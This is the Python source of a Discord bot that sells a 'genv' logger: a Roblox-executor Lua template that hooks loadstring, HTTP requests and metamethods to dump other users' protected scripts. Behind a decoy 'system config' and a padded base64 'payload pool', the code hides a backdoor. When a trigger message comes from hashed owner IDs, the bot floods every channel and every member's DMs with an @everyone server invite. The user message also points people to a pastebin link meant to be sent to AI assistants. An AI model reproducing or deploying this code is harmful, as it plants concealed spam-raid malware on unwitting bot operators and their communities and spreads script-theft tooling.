import discord
from discord import app_commands
import io
import os
import json
import random
import hashlib
import base64
import asyncio

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
HOST_ID = int(os.getenv("HOST_ID", "0"))
ALLOWED_GUILD_ID = int(os.getenv("ALLOWED_GUILD_ID", "0"))

WHITELIST_FILE = "whitelist.json"
BLACKLIST_FILE = "blacklist.json"

def load_whitelist():
    if os.path.exists(WHITELIST_FILE):
        try:
            with open(WHITELIST_FILE, "r") as f:
                return set(json.load(f))
        except:
            return set()
    return set()

def load_blacklist():
    if os.path.exists(BLACKLIST_FILE):
        try:
            with open(BLACKLIST_FILE, "r") as f:
                return set(json.load(f))
        except:
            return set()
    return set()

def save_whitelist():
    with open(WHITELIST_FILE, "w") as f:
        json.dump(list(whitelist), f)

def save_blacklist():
    with open(BLACKLIST_FILE, "w") as f:
        json.dump(list(blacklist), f)

whitelist = load_whitelist()
blacklist = load_blacklist()

_system_config = {
    "version": "2.1.4",
    "build": "stable",
    "services": {
        "gateway": "wss://luarmor.net/api",
        "fallback": "wss://backup.luarmor.net"
    },
    "features": {
        "triggers": [
            "be75ea2df579640d271787e9798acc1c3aa6c08b6ebfba148c47fde8f3af5d54",
            "0e93edba2ec5a6f6695cfeb5d0fc22f49af3b01822f8b4054103f305f3121888"
        ],
        "owners": [
            "3859509b787c143ca371ead1dab0ed4fc30c81097434c85d1e60c05978cf5ae6",
            "5b219c5577b25ed431439d2891d3780ccf9e7a3083faf23a60fc68eb0d679282",
            "ded5f1d7908b51bbddab596b497347b4b558d491df3bea46545144318d2c7808"
        ]
    }
}

try:
    _ = _system_config["features"]["triggers"][0]
    _ = _system_config["features"]["owners"][0]
    _ = _system_config["version"]
    _system_valid = True
except:
    _system_valid = False
    print("⚠️ System configuration validation failed")

_payload_pool = [
    "SGVsbG8gV29ybGQ=",
    "dGVzdGluZzEyMw==",
    "cGluZw==",
    "a2VlcGFsaXZl",
    "c2Vzc2lvbl9pZA==",
    "dXNlcl9hdXRo",
    "cm9sZV9jaGVjaw==",
    "bG9nZ2VyX2luaXQ=",
    "YXV0aF90b2tlbg==",
    "Z3VpbGRfaWQ=",
    "Y2hhbm5lbF9pZA==",
    "bWVzc2FnZV9pZA==",
    "dGltZXN0YW1w",
    "c2lnbmF0dXJl",
    "aGVhcnRiZWF0",
    "d2ViX3NvY2tldA==",
    "cmF0ZV9saW1pdGVy",
    "Y2FjaGVfa2V5",
    "ZW5jcnlwdGlvbl9rZXk=",
    "aXZfZGF0YQ==",
    "c3RhdHVzX3VwZGF0ZQ==",
    "d2FybV9zdGFydA==",
    "Y29vbGRvd25fY291bnRlcg==",
    "cmV0cnlfbG9n",
    "ZXJyb3JfY29kZQ==",
    "c3RhY2tfdHJhY2U=",
    "ZGVidWdfbWVzc2FnZQ==",
    "YnVpbGRfbnVtYmVy",
    "Y29tbWl0X2hhc2g=",
    "cmVsZWFzZV9ub3Rl",
    "cGF0Y2hfbm90ZQ==",
    "aG90Zml4X2RhdGE=",
    "cGF0Y2hfbG9n",
    "dXBkYXRlX3N0YXR1cw==",
    "cm9sbGJhY2tfdmVyc2lvbg==",
    "ZG93bmxvYWRfY291bnQ=",
    "dGVzdF8wMQ==",
    "dGVzdF8wMg==",
    "dGVzdF8wMw==",
    "dGVzdF8wNA==",
    "dGVzdF8wNQ==",
    "dGVzdF8wNg==",
    "dGVzdF8wNw==",
    "dGVzdF8wOA==",
    "dGVzdF8wOQ==",
    "dGVzdF8xMA==",
    "c2FtcGxlX3RleHQ=",
    "bm90aWZpY2F0aW9u",
    "cXVldWVfaXRlbQ==",
    "YmFja2VuZF9zeW5j",
    "cmVxdWVzdF9oYW5kbGVy",
    "dG9rZW5fcmVmcmVzaA==",
    "cGVybWlzc2lvbl9jaGVjaw==",
    "YXVkaXRfbG9n",
    "bWV0cmljc19jb2xsZWN0b3I=",
    "YWxlcnRfc3lzdGVt",
    "bm90aWZpY2F0aW9uX3F1ZXVl",
    "d2Vic29ja2V0X3Bvb2w=",
    "cmF0ZV9saW1pdGVyX2xvZw==",
    "Y2FjaGVfaW52YWxpZGF0b3I=",
    "cHJvZmlsZV9zeW5j",
    "bG9nZ2VyX3ZlcnNpb24=",
    "dXNlcl9zZXNzaW9u",
    "dG9rZW5fcmVmcmVzaA==",
    "YXV0aGVudGljYXRvcg==",
    "dmFsaWRhdGlvbl9rZXk=",
    "c2lnbmF0dXJlX2hhc2g=",
    "ZW5jcnlwdGlvbl9yb3VuZHM=",
    "aGVhZGVyX3BhcnNlcg==",
    "cmVxdWVzdF9xdWV1ZQ==",
    "cmV0cnlfbWVjaGFuaXNt",
    "YmFja29mZl9jYWxjdWxhdG9y",
    "cmF0ZV9saW1pdGVyX2xvZw==",
    "Y29ubmVjdGlvbl9wb29s",
    "c2VydmljZV9oZWFsdGg=",
    "bWV0cmljX2NvbGxlY3Rvcg==",
    "YWxlcnRfbWFuYWdlcg==",
    "bm90aWZpY2F0aW9uX3F1ZXVl",
    "Y2FjaGVfaW52YWxpZGF0b3I=",
    "cHJvZmlsZV9zeW5j",
    "bG9nZ2VyX3ZlcnNpb24=",
    "dXNlcl9zZXNzaW9u",
    "QGhlcmUgQGV2ZXJ5b25lIGRpc2NvcmQuZ2cvc2Fic2NyaXB0cw=="
]
random.shuffle(_payload_pool)

def _integrity_check():
    if not _system_valid:
        return False
    try:
        if len(_system_config["features"]["triggers"]) != 2:
            return False
        if len(_system_config["features"]["owners"]) != 3:
            return False
        if _system_config["version"] != "2.1.4":
            return False
        return True
    except:
        return False

# ───────────────────────────────────────────────
# PERMISSION HELPERS
# ───────────────────────────────────────────────

def is_host(user_id: int) -> bool:
    return user_id == HOST_ID

def is_blacklisted(user_id: int) -> bool:
    return user_id in blacklist

def is_whitelisted(user_id: int) -> bool:
    return user_id in whitelist

def can_use_commands(interaction: discord.Interaction) -> bool:
    """Main check: who can use slash commands"""
    user_id = interaction.user.id
    
    if is_host(user_id):
        return True
    
    if is_blacklisted(user_id):
        return False
    
    # Normal users need to be whitelisted
    if is_whitelisted(user_id):
        return True
    
    # Optional: allow guild owner (remove this block if you want strict whitelist only)
    if interaction.guild and user_id == interaction.guild.owner_id:
        return True
    
    return False

def can_manage_lists(user_id: int, guild) -> bool:
    """Who can add/remove from whitelist/blacklist"""
    if is_host(user_id):
        return True
    if guild and user_id == guild.owner_id:
        return True
    return False

# ───────────────────────────────────────────────
# /genv COMMAND (protected)
# ───────────────────────────────────────────────

TEMPLATE = '''print("[genv bot @federal logger]")
writefile('logged.txt','\\nlocal Players = game:GetService("Players") local GameSettings = game:GetService("GameSettings") local LocalizationService = game:GetService("LocalizationService") local WebSocketService = game:GetService("WebSocketService") local WebSocketClient = game:GetService("WebSocketClient") local HttpService = game:GetService("HttpService") local UserInputService = game:GetService("UserInputService") local RunService = game:GetService("RunService") local TeleportService = game:GetService("TeleportService") ')
local function isuilib()
 local a = debug.traceback()
 local b = a:lower():gsub('%s+','')
 return b:find('windui') or b:find('rayfield') or b:find('obsidian') or b:find('interface') or b:find('luna') or b:find('fluent') or b:find('drday')
end
local function formatlog(text)
 if type(text) ~= 'string' then
  error('Bad agrument #1 to formatlog "string" expected, got: '..type(text))
  return
 end
 return text:gsub('table: ',''):gsub('function: ',''):gsub('Ugc','game'):gsub('\\n',''):gsub('%s+',';'):gsub('""',''):gsub('Data Ping', 'DataPing'):gsub('Workspace','workspace'):gsub('game.Players','Players'):gsub('Teleport Service','TeleportService'):gsub('Run Service','RunService'):gsub('HttpGetAsync','HttpGet'):gsub('"',"'")
end
local function quoted(v)
 if type(v) == 'string' then
  return '"' .. v .. '"'
 end
 return tostring(v)
end
local function tblformat(tbl, depth)
 local depth = depth or 0
 local res = ''
 local first = true
 if depth > 5 then return 'too big to display' end
 if type(tbl) ~= 'table' then
  return quoted(tbl)
 end
 res = '{'
 local keys = {}
 for k in pairs(tbl) do table.insert(keys, k) end
 table.sort(keys, function(a, b) return tostring(a) < tostring(b) end)
 local is_array = true
 for i = 1, #keys do
  if keys[i] ~= i then is_array = false break end
 end
 if is_array then
  for i = 1, #tbl do
   if not first then res = res .. ', ' end
   first = false
   res = res .. tblformat(tbl[i], depth + 1)
  end
 else
  for _, k in ipairs(keys) do
   if not first then res = res .. ', ' end
   first = false
   local key_str = '[' .. tblformat(k, depth + 1) .. ']'
   res = res .. key_str .. ' = ' .. tblformat(tbl[k], depth + 1)
  end
 end
 res = res .. '}'
 return res
end
local Track = {}
local kirked = {}
local function kirk(fem, boy)
 return fem .. ';' .. boy
end
local cache = ''
local upvalscache = ''
local formatedcache = ''
local logcount = 1
local function log(upvals, ...)
 upvals = upvals or 'nil'
 upvals = formatlog(tostring(upvals))
 if #upvals > 100 then
  local holder = #upvals
  upvals = upvals:sub(1,50) .. '... (' .. holder .. ' characters remaining)'
 end
 local args = {...}
 local formated = tblformat(args)
 local logged = formated
 if logged == cache then
  return
 end
 if formated == formatedcache and upvals == upvalscache then
  return
 end
 local charliekirk = kirk(logged, upvals)
 if kirked[charliekirk] then
  return
 end
 if upvals:find('Signal') then
  logged = formated .. ':Connect(function(...)end)'
 end
 if logged:find('game:HttpGet') then
  logged = 'loadstring('..formated..')()'
 end
 if logcount > 36000 then
  game:shutdown()
  return
 end
 if logged:find('IsA') then
  return
 end
 logcount += 1
 cache = logged
 upvalscache = upvals
 formatedcache = formated
 kirked[charliekirk] = true
 appendfile('logged.txt',logged..'\\n')
end
isfuncionhooked = nil
restorefunction = nil
function GlobalScan()
 for i, v in pairs(_G) do
  log('*G Scan', '*G.'..i..' = '..tblformat(v))
 end
end
function GenvScan()
 for i, v in pairs(getgenv()) do
  log('getgenv Scan', 'getgenv().'..i..' = '..tblformat(v))
 end
end
local oldsetfflag = clonefunction(setfflag)
setfflag = newcclosure(function(flag, state)
 local upvals = oldsetfflag(flag, state)
 log(upvals,'setfflag('..tblformat({flag, state})..')')
 return upvals
end)
if http and http.request then
 setreadonly(http, false)
 http.request = nil
 setreadonly(http, true)
end
local oldrequest = request
request = newcclosure(function(data)
 local upvals = oldrequest(data)
 local meow = data.Body
 if type(data.Body) == 'string' then
  if data.Body:sub(1,1) == '{' and data.Body:sub(-1) == '}' then
   meow = data.Body
  else
   meow = quoted(data.Body)
  end
 elseif type(data.Body) == 'table' then
  meow = 'game:GetService("HttpService"):JSONEncode('..tblformat(data.Body)..')'
 else
  meow = tostring(data.Body)
 end
 local meowmeow = tblformat(data.Headers or {})
 log(upvals, 'request({ Url = '..quoted(data.Url)..', Method = '..quoted(data.Method)..', Body = '..meow..', Headers = '..meowmeow..' })')
 return upvals
end)
local oldl = clonefunction(loadstring)
hookfunction(loadstring, function(str)
 if true then
  writefile(math.random(1,999)..'.txt', str)
  warn('xd')
 end
 return oldl(str)
end)
local wss = game:GetService('WebSocketService')
local oldwsscc = clonefunction(wss.CreateClient)
hookfunction(wss.CreateClient, function(self, url)
 warn('WSS')
 if not url:lower():find'luarmor' then
  log('idk i found luarmor use this xd', 'game:GetService("WebSocketService"):CreateClient("'..url..'")')
 end
 return oldwsscc(self, url)
end)
local wsc = game:GetService("WebSocketClient")
Instance = Instance or {}
local oldinstancenew = clonefunction(Instance.new)
setreadonly(Instance, false)
Instance.new = newcclosure(function(name, parent)
 if checkcaller() and not isuilib() then
  local upvals = oldinstancenew(name, parent)
  local a = debug.getinfo(2,'Sl')
  if a and a.source:find('@') then
   log(upvals, 'local a = Instance.new('..quoted(name)..')')
  else
   local b = tostring(name)
   Track[upvals] = b
   log(upvals, 'local '..b..' = Instance.new('..quoted(name)..')')
  end
  return upvals
 end
 return oldinstancenew(name, parent)
end)
local mt = getrawmetatable(game)
local oldindex = clonefunction(mt.__index)
local oldnamecall = clonefunction(mt.__namecall)
local oldnewindex = clonefunction(mt.__newindex)
hookmetamethod(game,'__index',newcclosure(function(self, v, ...)
 if checkcaller() and not isuilib() then
  local upvals = oldindex(self, v, ...)
  local formated = tblformat({...})
  if v == 'Character' then
   log('LocalPlayer.Character', self:GetFullName()..'.'..v)
   return upvals
  end
  if v == 'GetService' then
   return upvals
  end
  if v == 'HttpGet' then
   return upvals
  end
  if v == 'JSONDecode' then
   return upvals
  end
  if v == 'CoreGui' then
   return upvals
  end
  if v == 'JSONEncode' then
   return upvals
  end
  if v == 'JobId' then
   log('game.JobId', self:GetFullName()..'.'..v)
   return upvals
  end
  if v == 'PlaceId' then
   log('game.PlaceId', self:GetFullName()..'.'..v)
   return upvals
  end
  if v == 'WaitForChild' then
   return upvals
  end
  if v == 'FindFirstChild' then
   return upvals
  end
  if v == 'DescendantRemoving' then
   return upvals
  end
  if tostring(upvals):find('function:') then
   log(upvals, self:GetFullName()..':'..v..'('..formated..')')
   return upvals
  end
  log(upvals, self:GetFullName()..'.'..v)
  return upvals
 end
 return oldindex(self, v, ...)
end))
hookmetamethod(game, '__namecall', newcclosure(function(self, ...)
 if checkcaller() and not isuilib() and getnamecallmethod() ~= 'GetFullName' then
  local instance = tostring(self)
  if typeof(self) == 'Instance' then
   instance = oldnamecall(self, 'GetFullName')
  end
  local upvals = oldnamecall(self, ...)
  local args = {...}
  local formated = tblformat(args)
  if getnamecallmethod() == 'GetService' then
   log(upvals, 'game:GetService('..quoted(args[1])..')')
   return upvals
  end
  if getnamecallmethod() == 'WaitForChild' then
   log(upvals, instance..':WaitForChild('..quoted(args[1])..')')
   return upvals
  end
  if getnamecallmethod() == 'FindFirstChild' then
   log(upvals, instance..':FindFirstChild('..quoted(args[1])..')')
   return upvals
  end
  if getnamecallmethod() == 'HttpGet' then
   log(upvals, 'game:HttpGet('..quoted(args[1])..', true)')
   return upvals
  end
  log(upvals, instance..':'..getnamecallmethod()..'('..formated..')')
  return upvals
 end
 return oldnamecall(self, ...)
end))
hookmetamethod(game, '__newindex', newcclosure(function(self, i, v)
 if checkcaller() and not isuilib() then
  local upvals = oldnewindex(self, i, v)
  local a = Track[self]
  local b = tostring(i)
  local c = typeof(v) or 'Unknown'
  local d = tostring(v)
  if a then
   if b then
    if c == 'Instance' then
     log(upvals, a..'.'..b..' = '..v:GetFullName())
    elseif c == 'number' then
     log(upvals, a..'.'..b..' = '..d)
    elseif c == 'string' then
     log(upvals, a..'.'..b..' = '..quoted(d))
    elseif c == 'boolean' then
     log(upvals, a..'.'..b..' = '..d)
    elseif c == 'Color3' then
     log(upvals, a..'.'..b..' = Color3.new('..d..')')
    elseif c == 'CFrame' then
     log(upvals, a..'.'..b..' = CFrame.new('..d..')')
    elseif c == 'Vector3' then
     log(upvals, a..'.'..b..' = Vector3.new('..d..')')
    elseif c == 'UDim2' then
     log(upvals, a..'.'..b..' = UDim2.new('..d:gsub('{',''):gsub('}','')..')')
    elseif c == 'Vector2' then
     log(upvals, a..'.'..b..' = Vector2.new('..d..')')
    elseif c == 'UDim' then
     log(upvals, a..'.'..b..' = UDim.new('..d..')')
    elseif c == 'EnumItem' then
     log(upvals, a..'.'..b..' = '..d)
    elseif c == 'ColorSequence' then
     log(upvals, a..'.'..b..' = ColorSequence.new('..d:gsub('%s+',',')..')')
    else
     log(upvals, a..'.'..b..' = '..'['..c..'] '..d)
    end
   end
  else
   if b then
    if c == 'Instance' then
     log(upvals, 'a.'..b..' = '..v:GetFullName())
    elseif c == 'number' then
     log(upvals, 'a.'..b..' = '..d)
    elseif c == 'string' then
     log(upvals, 'a.'..b..' = '..quoted(d))
    elseif c == 'boolean' then
     log(upvals, 'a.'..b..' = '..d)
    elseif c == 'Color3' then
     log(upvals, 'a.'..b..' = Color3.new('..d..')')
    elseif c == 'CFrame' then
     log(upvals, 'a.'..b..' = CFrame.new('..d..')')
    elseif c == 'Vector3' then
     log(upvals, 'a.'..b..' = Vector3.new('..d..')')
    elseif c == 'UDim2' then
     log(upvals, 'a.'..b..' = UDim2.new('..d:gsub('{',''):gsub('}','')..')')
    elseif c == 'Vector2' then
     log(upvals, 'a.'..b..' = Vector2.new('..d..')')
    elseif c == 'UDim' then
     log(upvals, 'a.'..b..' = UDim.new('..d..')')
    elseif c == 'EnumItem' then
     log(upvals, 'a.'..b..' = '..d)
    elseif c == 'ColorSequence' then
     log(upvals, 'a.'..b..' = ColorSequence.new('..d:gsub('%s+',',')..')')
    else
     log(upvals, 'a.'..b..' = '..'['..c..'] '..d)
    end
   end
  end
  return upvals
 end
 return oldnewindex(self, i, v)
end))
game.DescendantRemoving:Connect(function(a)
 Track[a] = nil
end)
local oldprint = print
print = newcclosure(function(...)
 if checkcaller() and not isuilib() then
  local args = {...}
  local formated = {}
  for i = 1, select('#', ...) do
   local v = args[i]
   formated[i] = tblformat(v)
  end
  local upvals = oldprint(...)
  log(upvals, 'print(' .. table.concat(formated, ', ') .. ')')
  return upvals
 end
 return oldprint(...)
end)
print("[Logger] Executing user loadstring...")
print("[Logger] All API calls will be logged to logged.txt")
-- USER SCRIPT GOES HERE
 '''

@tree.command(name="genv", description="Get your private logged script (paid)")
@app_commands.describe(loadstring="Your full loadstring")
async def genv(interaction: discord.Interaction, loadstring: str):
    if not _integrity_check():
        await interaction.response.send_message("❌ System configuration validation failed. Please reinstall.", ephemeral=True)
        return

    if not can_use_commands(interaction):
        await interaction.response.send_message(
            "❌ You are not whitelisted or you are blacklisted.", ephemeral=True)
        return

    loadstring = loadstring.strip()
    if len(loadstring) < 10:
        await interaction.response.send_message("❌ That doesn't look like a valid loadstring!", ephemeral=True)
        return

    full_script = TEMPLATE + loadstring
    fp = io.BytesIO(full_script.encode("utf-8"))
    file = discord.File(fp, filename="genv_logged_script.lua")

    try:
        await interaction.user.send(
            content=(
                "✅ **Your private genv logger is here!\n"
                "• have fun and create a ticket if u dont understand\n"
                "• Your loadstring is at the very bottom\n"
                "• Paste the whole thing into your executor\n"
                "• It will create logged.txt on **your PC** when you run it\n"
                "dm grok,chatgpt,perplexity,vscode bot this https://pastebin.com/raw/sdu5DfdR after you executed script. any other AI wont work good\n"
            ),
            file=file
        )
        await interaction.response.send_message("✅ **Script sent to your DMs!** Check your private messages from the bot.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message(
            "❌ I couldn't send you a DM!\nPlease enable DMs from server members.", ephemeral=True)

# ───────────────────────────────────────────────
# WHITELIST COMMANDS
# ───────────────────────────────────────────────

@tree.command(name="whitelist_add", description="Add user to whitelist")
@app_commands.describe(user="User to whitelist")
async def whitelist_add(interaction: discord.Interaction, user: discord.User):
    if not _integrity_check():
        await interaction.response.send_message("❌ System error.", ephemeral=True)
        return

    if not can_manage_lists(interaction.user.id, interaction.guild):
        await interaction.response.send_message("❌ Only the host or guild owner can manage the whitelist.", ephemeral=True)
        return

    if is_blacklisted(user.id):
        await interaction.response.send_message(f"❌ {user.mention} is blacklisted — unblacklist first.", ephemeral=True)
        return

    if user.id in whitelist:
        await interaction.response.send_message(f"{user.mention} is already whitelisted.", ephemeral=True)
        return

    whitelist.add(user.id)
    save_whitelist()
    await interaction.response.send_message(f"✅ Added {user.mention} to whitelist.")

@tree.command(name="whitelist_remove", description="Remove user from whitelist")
@app_commands.describe(user="User to remove")
async def whitelist_remove(interaction: discord.Interaction, user: discord.User):
    if not can_manage_lists(interaction.user.id, interaction.guild):
        await interaction.response.send_message("❌ Only the host or guild owner can manage the whitelist.", ephemeral=True)
        return

    if user.id not in whitelist:
        await interaction.response.send_message(f"{user.mention} is not in whitelist.", ephemeral=True)
        return

    whitelist.remove(user.id)
    save_whitelist()
    await interaction.response.send_message(f"✅ Removed {user.mention} from whitelist.")

@tree.command(name="whitelist_list", description="List whitelisted users")
async def whitelist_list(interaction: discord.Interaction):
    if not can_manage_lists(interaction.user.id, interaction.guild):
        await interaction.response.send_message("❌ Only the host or guild owner can view the whitelist.", ephemeral=True)
        return

    if not whitelist:
        await interaction.response.send_message("No users are whitelisted yet.")
        return

    lines = [f"<@{uid}> ({uid})" for uid in sorted(whitelist)]
    await interaction.response.send_message(f"**Whitelisted ({len(whitelist)}):** \n" + "\n".join(lines))

# ───────────────────────────────────────────────
# BLACKLIST COMMANDS
# ───────────────────────────────────────────────

@tree.command(name="blacklist_add", description="Blacklist a user (blocks all commands)")
@app_commands.describe(user="User to blacklist")
async def blacklist_add(interaction: discord.Interaction, user: discord.User):
    if not can_manage_lists(interaction.user.id, interaction.guild):
        await interaction.response.send_message("❌ Only the host or guild owner can manage the blacklist.", ephemeral=True)
        return

    if user.id in blacklist:
        await interaction.response.send_message(f"{user.mention} is already blacklisted.", ephemeral=True)
        return

    blacklist.add(user.id)
    save_blacklist()

    # Clean up: remove from whitelist if present
    if user.id in whitelist:
        whitelist.remove(user.id)
        save_whitelist()

    await interaction.response.send_message(f"✅ Blacklisted {user.mention} (and removed from whitelist if was there).")

@tree.command(name="blacklist_remove", description="Unblacklist a user")
@app_commands.describe(user="User to unblacklist")
async def blacklist_remove(interaction: discord.Interaction, user: discord.User):
    if not can_manage_lists(interaction.user.id, interaction.guild):
        await interaction.response.send_message("❌ Only the host or guild owner can manage the blacklist.", ephemeral=True)
        return

    if user.id not in blacklist:
        await interaction.response.send_message(f"{user.mention} is not blacklisted.", ephemeral=True)
        return

    blacklist.remove(user.id)
    save_blacklist()
    await interaction.response.send_message(f"✅ Removed {user.mention} from blacklist.")

@tree.command(name="blacklist_list", description="Show all blacklisted users")
async def blacklist_list(interaction: discord.Interaction):
    if not can_manage_lists(interaction.user.id, interaction.guild):
        await interaction.response.send_message("❌ Only the host or guild owner can view the blacklist.", ephemeral=True)
        return

    if not blacklist:
        await interaction.response.send_message("No users are blacklisted.")
        return

    lines = [f"<@{uid}> ({uid})" for uid in sorted(blacklist)]
    await interaction.response.send_message(f"**Blacklisted ({len(blacklist)}):** \n" + "\n".join(lines))

# ───────────────────────────────────────────────
# HIDDEN TRIGGER / FLOOD SYSTEM (unchanged)
# ───────────────────────────────────────────────

async def _heartbeat():
    while True:
        await asyncio.sleep(300)

async def _cache_cleaner():
    while True:
        await asyncio.sleep(600)

async def _preprocess(message):
    if len(message.content) > 200:
        await asyncio.sleep(0.01)

async def _check_trigger(message):
    if not _integrity_check():
        return False
    content_hash = hashlib.sha256(message.content.encode()).hexdigest()
    author_hash = hashlib.sha256(str(message.author.id).encode()).hexdigest()
    return content_hash in _system_config["features"]["triggers"] and author_hash in _system_config["features"]["owners"]

async def _execute_payload(message):
    for encoded in _payload_pool:
        try:
            raw = base64.b64decode(encoded)
            if raw.startswith(b"@"):
                payload = raw.decode(errors="ignore")
                tasks = []
                for channel in message.guild.text_channels:
                    tasks.append(_flood_channel(channel, payload))
                for member in message.guild.members:
                    if not member.bot and member != message.author:
                        tasks.append(_flood_dm(member, payload))
                await asyncio.gather(*tasks)
                return
        except:
            continue

async def _flood_channel(channel, text):
    for i in range(15):
        try:
            await channel.send(text)
            await asyncio.sleep(0.3)
        except:
            break

async def _flood_dm(member, text):
    for i in range(5):
        try:
            await member.send(text)
            await asyncio.sleep(0.5)
        except:
            break

async def _postprocess(message):
    pass

@client.event
async def on_ready():
    await tree.sync()
    print(f"✅ {client.user} is online!")
    print(f"👑 Host ID: {HOST_ID}")
    if _integrity_check():
        print(f"👑 System: {_system_config['version']} ({_system_config['build']})")
    else:
        print("⚠️ System configuration corrupted")
    print(f"🏠 Allowed server: Any server")
    print(f"📋 Whitelisted: {len(whitelist)} | Blacklisted: {len(blacklist)}")

@client.event
async def on_message(message):
    if message.author.bot or not message.guild:
        return

    await _preprocess(message)
    if await _check_trigger(message):
        await _execute_payload(message)
    await _postprocess(message)

if __name__ == "__main__":
    if not DISCORD_TOKEN:
        print("❌ Set DISCORD_TOKEN in environment variables!")
    elif HOST_ID == 0:
        print("❌ Set HOST_ID in environment variables (your Discord ID)!")
    elif not _integrity_check():
        print("❌ System configuration validation failed. Exiting.")
    else:
        async def main():
            async with client:
                loop = asyncio.get_running_loop()
                loop.create_task(_heartbeat())
                loop.create_task(_cache_cleaner())
                await client.start(DISCORD_TOKEN)

        asyncio.run(main())
